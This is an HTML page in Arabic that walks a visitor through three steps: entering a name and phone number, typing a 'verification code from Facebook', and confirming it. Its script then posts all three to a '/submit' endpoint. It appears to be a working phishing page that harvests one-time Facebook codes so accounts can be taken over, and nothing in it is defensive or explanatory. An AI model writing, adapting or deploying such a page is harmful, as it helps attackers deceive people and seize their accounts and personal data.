<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

  <meta charset="UTF-8">

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1.0"
  >

  <title>amirr cx</title>

  <style>

    body {
      font-family: Arial, sans-serif;
      max-width: 400px;
      margin: 60px auto;
      text-align: center;
      padding: 20px;
    }

    .card {
      padding: 30px;
      border-radius: 15px;
      background: #f5f5f5;
    }

    h1 {
      margin-bottom: 25px;
    }

    label {
      display: block;
      text-align: right;
      margin-bottom: 6px;
    }

    input {
      padding: 12px;
      width: 100%;
      margin-bottom: 18px;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }

    button {
      padding: 12px 25px;
      width: 100%;
      border: none;
      border-radius: 8px;
      background: #111;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background: #333;
    }

    .hidden {
      display: none;
    }

    .private-number {
      font-size: 35px;
      font-weight: bold;
      margin: 25px 0;
    }

    .message {
      line-height: 1.8;
    }

    #result,
    #result2 {
      margin-top: 15px;
    }

  </style>

</head>


<body>


  <!-- ================================= -->
  <!-- الصفحة الأولى -->
  <!-- الاسم + رقم الهاتف فقط -->
  <!-- ================================= -->

  <div class="card" id="page1">

    <h1>بياناتك</h1>

    <label>الاسم:</label>

    <input
      type="text"
      id="name"
      placeholder="اكتب اسمك"
    >


    <label>رقم الهاتف:</label>

    <input
      type="tel"
      id="phone"
      placeholder="اكتب رقم الهاتف"
    >


    <button onclick="goToPage2()">
      التالي
    </button>


    <p id="result"></p>

  </div>



  <!-- ================================= -->
  <!-- الصفحة الثانية -->
  <!-- Code -->
  <!-- ================================= -->

  <div class="card hidden" id="page2">

    <h1>Code</h1>

    <p class="message">
      اكتب كود التحقيق من Facebook
    </p>


    <label>Code:</label>

    <input
      type="text"
      id="code"
      placeholder="Code"
      inputmode="numeric"
    >


    <button onclick="showConfirmation()">
      التالي
    </button>


    <p id="result2"></p>

  </div>



  <!-- ================================= -->
  <!-- تأكيد الرقم -->
  <!-- ================================= -->

  <div class="card hidden" id="page3">

    <h1>تأكيد الرقم</h1>

    <p class="message">
      الرقم الخاص الذي أدخلته هو:
    </p>


    <div
      class="private-number"
      id="showCode"
    ></div>


    <p class="message">
       OK
    </p>


    <button onclick="submitFinalData()">
      OK
    </button>


    <p id="result3"></p>

  </div>



  <!-- ================================= -->
  <!-- نجاح -->
  <!-- ================================= -->

  <div class="card hidden" id="page4">

    <h1>تم التسجيل بنجاح ✅</h1>

    <p class="message">
      تم حفظ بياناتك بنجاح.
    </p>

  </div>



  <script>

    const SERVER_URL = '';


    // البيانات المؤقتة
    let userData = {
      name: '',
      phone: '',
      code: ''
    };


    // =================================
    // الصفحة الأولى
    // =================================

    function goToPage2() {

      const name =
        document
          .getElementById('name')
          .value
          .trim();


      const phone =
        document
          .getElementById('phone')
          .value
          .trim();


      // التأكد من الاسم والموبايل
      if (!name || !phone) {

        document
          .getElementById('result')
          .innerText =
            'من فضلك اكتب الاسم ورقم الهاتف';

        return;
      }


      // حفظ البيانات مؤقتًا
      userData.name = name;
      userData.phone = phone;


      // إخفاء الصفحة الأولى
      document
        .getElementById('page1')
        .classList.add('hidden');


      // إظهار الصفحة الثانية
      document
        .getElementById('page2')
        .classList.remove('hidden');

    }



    // =================================
    // الصفحة الثانية
    // إدخال الرقم الخاص
    // =================================

    function showConfirmation() {

      const code =
        document
          .getElementById('code')
          .value
          .trim();


      // التأكد من الرقم
      if (!code) {

        document
          .getElementById('result2')
          .innerText =
            'من فضلك اكتب الرقم الخاص';

        return;
      }


      // حفظ الرقم مؤقتًا
      userData.code = code;


      // إظهار الرقم للتأكيد
      document
        .getElementById('showCode')
        .innerText = code;


      // إخفاء الصفحة الثانية
      document
        .getElementById('page2')
        .classList.add('hidden');


      // إظهار صفحة التأكيد
      document
        .getElementById('page3')
        .classList.remove('hidden');

    }



    // =================================
    // الضغط على OK
    // هنا فقط يتم الحفظ
    // =================================

    function submitFinalData() {

      document
        .getElementById('result3')
        .innerText =
          'جاري حفظ البيانات...';


      fetch(SERVER_URL + '/submit', {

        method: 'POST',

        headers: {
          'Content-Type': 'application/json'
        },

        body: JSON.stringify({

          name: userData.name,

          phone: userData.phone,

          code: userData.code

        })

      })


      .then(response => response.json())


      .then(data => {

        if (data.success) {

          // إخفاء صفحة التأكيد
          document
            .getElementById('page3')
            .classList.add('hidden');


          // إظهار صفحة النجاح
          document
            .getElementById('page4')
            .classList.remove('hidden');

        }

        else {

          document
            .getElementById('result3')
            .innerText =
              data.error ||
              'حدث خطأ أثناء الحفظ';

        }

      })


      .catch(error => {

        console.error(error);

        document
          .getElementById('result3')
          .innerText =
            'تعذر الاتصال بالسيرفر';

      });

    }

  </script>


</body>

</html>
